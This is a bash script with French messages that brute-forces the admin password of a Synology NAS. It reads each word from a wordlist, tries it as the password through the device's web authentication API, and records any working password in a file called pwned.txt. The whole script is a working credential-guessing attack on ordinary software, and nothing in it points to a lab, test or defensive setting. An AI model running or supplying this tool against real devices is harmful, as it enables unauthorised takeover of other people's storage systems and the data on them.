#!/bin/bash
date
echo " ./bruteforce.sh password.txt 192.168.1.101"
cat password.txt |  while read output
do
[[ -z "$1" ]] && { echo "Parameter 1 is empty - fichier.txt " ; exit 1; }
[[ -z "$2" ]] && { echo "Parameter 2 is empty - ip_adress_nas " ; exit 1; }
#[[ -z "$3" ]] && { echo "Parameter 3 is empty - password " ; exit 1; }

#echo "mot" $output
#echo "fichir de dico nom fihier" $1
#echo "target" $2
echo "tentative avec le mot de passe $output sur $2"
#sleep 60
echo "-----------"
echo "test for " $output
echo "-----------"
syno_user="admin"
syno_pwd=$output
syno_url=$2 # eg 192.168.1.100
vAuth=2
touch pwned.txt
# Get Paths (recommended by Synology for further update)
curlResult=$(curl -s "http://${syno_url}:5000/webapi/query.cgi?api=SYNO.API.Info&method=Query&version=1&query=SYNO.API.Auth,SYNO.SurveillanceStation.Camera")
authPath=$(echo "$curlResult" | jq -r '.["data"]["SYNO.API.Auth"]["path"]')
#  login
curlResult=$(curl -s "http://${syno_url}:5000/webapi/${authPath}?api=SYNO.API.Auth&method=Login&version=${vAuth}&account=${syno_user}&passwd=${syno_pwd}&session=SurveillanceStation&format=sid")

if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'true' ]]; then
                echo "succes login for $syno_url"
                echo "---------------ecriture dans le log--------------------"
                echo "login is admin $output" >> pwned.txt
                exit 0
fi
if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'false' ]]; then
        echo "Error on login : bad password !!!"
        echo "$1 login not found"
else
        echo "Error on login"
        echo "$1 login is down or unreachable"
fi
                ##
curl -s "http://${syno_url}:5000/webapi/${authPath}?api=SYNO.API.Auth&method=Logout&version=${vAuth}&_sid=${SID}" > /dev/null 2>&1
done
